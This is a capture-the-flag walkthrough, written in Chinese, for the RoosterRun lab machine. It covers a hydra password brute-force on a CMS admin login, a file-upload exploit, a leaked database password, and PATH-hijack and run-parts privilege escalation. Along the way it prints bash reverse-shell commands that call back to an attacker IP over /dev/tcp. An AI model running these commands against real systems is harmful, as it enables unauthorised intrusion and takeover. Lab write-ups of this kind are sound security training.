# RoosterRun

2025.03.17 https://hackmyvm.eu/machines/machine.php?vm=RoosterRun

[video](https://www.bilibili.com/video/BV1mXQqYXE4C/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

80 发现 CMS: CMS Made Simple version 2.2.9.1 找到登陆窗口 http://192.168.5.40/admin/login.php ，在 news 中看到了一个用户名 admin 进行一下爆破：

```
hydra -t 64 -l admin -P /usr/share/wordlists/rockyou.txt 192.168.5.40 -f http-post-form "/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=User name or password incorrect"

[80][http-post-form] host: 192.168.5.40   login: admin   password: homeandaway
```

找到了管理员密码，登陆到系统，参照 https://www.exploit-db.com/exploits/48742 这里在 FileManager 中可以上传 pthml 文件，进而执行代码。

上传至 upload 文件夹上，然后访问，就会在 kali 上得到反弹的 shell。

发现这个 CMS 的数据库配置文件：

```
www-data@rooSter-Run:/var/www/html$ cat config.php
<?php
# CMS Made Simple Configuration File
# Documentation: https://docs.cmsmadesimple.org/configuration/config-file/config-reference
#
$config['dbms'] = 'mysqli';
$config['db_hostname'] = 'localhost';
$config['db_username'] = 'admin';
$config['db_password'] = 'j42W9kDq9dN9hK';
$config['db_name'] = 'cmsms_db';
$config['db_prefix'] = 'cms_';
$config['timezone'] = 'Europe/Berlin';
```

但是这个密码不是用户 matthieu 的。

/opt 目录被设置了 acl，进行更详细查看：

```
getfacl -R -s -p / 2>/dev/null

# file: //usr/local/bin
# owner: root
# group: root
user::rwx
user:www-data:rwx
user:matthieu:r-x
group::---
mask::rwx
other::---
```

发现 www-data 用户可以修改 /usr/local/bin , 同时 /usr/local/bin 在 $PATH 中第二项。

在 /home/matthieu/中发现一个脚本 StaleFinder ，其中的 echo 没有使用全局路径，在 /usr/bin 中有 echo，但是 /usr/local/bin 这个在 PATH 中比/usr/bin 位置靠前，可以进行命令劫持。

盲猜 StaleFinder 脚本应该是某个用户执行的定时任务，这里看到第一行 #!/usr/bin/env bash ，会从 path 环境变量中查找 bash ，然后在用这个 bash 执行解析脚本。这里利用上面的/usr/local/bin 可写，可以劫持 bash 命令：

```
echo -e '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' > /usr/local/bin/bash
chmod +x /usr/local/bin/bash
```

同时在 kali 上创建监听，等待反弹。

拿到了 user flag:

```
matthieu@rooSter-Run:~$ cat user.txt
32af3c9a9cb2fb748aef29457d8cff55
```

在 /opt/maintenance 中发现 backup.sh 文件，pre-prod-tasks 和 prod-tasks 文件夹对其他用户有写权限，最后执行 /usr/bin/run-parts /opt/maintenance/prod-tasks 中的脚本文件。

if -O 参数会检测当前执行脚本的用户 id 和这个文件的所属用户的 id 是否一致，一致返回 true。换句话就是这个文件是否是属于当前执行 if 判断命令的用户：

```
if [ -O /etc/passwd ]; then echo "owner"; else echo "not owner"; fi
```

向 pre-prod-tasks 中写入 sh 脚本:

```
echo -e '#!/bin/bash\n/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8889 0>&1"' > /opt/maintenance/pre-prod-tasks/run.sh; chmod +x /opt/maintenance/pre-prod-tasks/run.sh
```

/usr/bin/run-parts 默认情况下执行的脚本不能带扩展名(如果没有给出 --lsbsysinit 选项或 --regex 选项，则名称必须完全由 ASCII 大写和小写字母、ASCII 数字、ASCII 下划线和 ASCII 减号连字符组成)，所以在文件执行 cp 后，执行 mv 操作去掉 sh 后缀：

```
matthieu@rooSter-Run:/opt/maintenance/prod-tasks$ mv run.sh run
```

等待 1 分钟，反弹 shell 执行，拿到了最终的 flag:

```
cat root.txt
670ff72e9d8099ac39c74c080348ec17
```
